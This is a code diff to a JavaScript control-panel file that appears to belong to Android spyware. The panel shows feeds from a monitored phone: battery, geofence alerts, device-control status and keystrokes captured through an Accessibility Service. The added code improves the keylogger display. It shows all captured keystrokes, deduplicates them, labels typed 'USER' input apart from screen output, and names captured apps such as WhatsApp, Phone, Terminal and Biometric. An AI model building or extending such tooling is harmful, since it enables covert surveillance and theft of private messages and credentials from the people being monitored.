@@ -323,13 +323,66 @@ function initializeDataFeedListeners(uid) {
         const rows = [['Level',`${d.level_percent||'?'}%`],['Status',d.status],['Health',d.health],['Temp',`${d.temperature_c||'?'}°C`],['Voltage',`${d.voltage_mv||'?'}mV`],['Source',d.charge_source],['Tech',d.technology]];
         f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
+
+    // ── KEYLOGGER — User Input vs Device Output, deduplicated ──
     listenToFeed(uid, 'keylog', (d) => {
-        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,50);
+        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
         const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
         const f = document.getElementById('keylog-feed'); if(!f) return;
         if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}
-        f.innerHTML = items.map(k=>`<div class="feed-item"><strong>${esc(k.app||'unknown')}</strong> <small>${fmtTime(k.timestamp)}</small><br><code>${esc(k.text||'')}</code></div>`).join('');
+
+        var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui',
+            'com.samsung.android.app', 'com.google.android', 'android',
+            'com.samsung.android.dialer'];
+
+        var grouped = [];
+        var prev = null;
+        items.forEach(function(k) {
+            var app = k.app || 'unknown';
+            var text = (k.text || '').trim();
+            if(!text) return;
+            if(text.replace(/[\u200B-\u200D\uFEFF]/g, '').length === 0) return;
+
+            var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });
+            var isDuplicate = prev && prev.app === app && prev.text === text &&
+                              (k.timestamp - prev.timestamp) < 2000;
+
+            if(!isDuplicate) {
+                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event});
+            }
+            prev = {app: app, text: text, timestamp: k.timestamp};
+        });
+
+        var display = grouped.slice(0, 60);
+        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events (deduplicated) — <span style="color:#4ecdc4;">⌨️ USER</span> = typed input, <span style="color:#ffd93d;">🖥️ DEVICE</span> = screen output</div>';
+
+        display.forEach(function(k) {
+            var icon = k.isSystem ? '🖥️' : '⌨️';
+            var label = k.isSystem ? 'DEVICE' : 'USER';
+            var color = k.isSystem ? '#ffd93d' : '#4ecdc4';
+            var bgColor = k.isSystem ? 'rgba(255,217,61,0.05)' : 'rgba(78,205,196,0.05)';
+            var borderColor = k.isSystem ? '#ffd93d' : '#4ecdc4';
+
+            var appName = k.app.split('.').pop() || k.app;
+            if(appName === 'whatsapp') appName = 'WhatsApp';
+            else if(appName === 'dialer') appName = 'Phone';
+            else if(appName === 'yantra') appName = 'Terminal';
+            else if(appName === 'biometrics') appName = 'Biometric';
+            else if(appName === 'setting') appName = 'Settings';
+            else if(appName === 'app') appName = 'Samsung';
+
+            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
+            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
+            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
+            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
+            html += '</div>';
+            html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
+            html += '</div>';
+        });
+
+        f.innerHTML = html;
     });
+
     listenToFeed(uid, 'geofence_alerts', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
         const f = document.getElementById('geofence-feed'); if(!f) return;
@@ -576,7 +629,7 @@ function initializeDataFeedListeners(uid) {
         }
     });
 
-    // ── DEVICE CONTROL STATUS (reboot, shutdown, uninstall, etc.) ──
+    // ── DEVICE CONTROL STATUS ──
     listenToFeed(uid, 'device_control_status', (d) => {
         const f = document.getElementById('devicecontrol-feed'); if(!f||!d) return;
         var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '📱' : '❌';
